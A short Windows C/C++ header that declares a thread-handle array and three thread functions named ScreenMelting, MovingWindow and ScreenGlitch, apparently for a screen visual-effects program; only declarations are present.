#pragma once
#include <Windows.h>
#include <Math.h>

HANDLE g_hThreads[10];

DWORD WINAPI ScreenMelting(LPVOID lpParameter);

DWORD WINAPI MovingWindow(LPVOID lpParameter);

DWORD WINAPI ScreenGlitch(LPVOID lpParameter);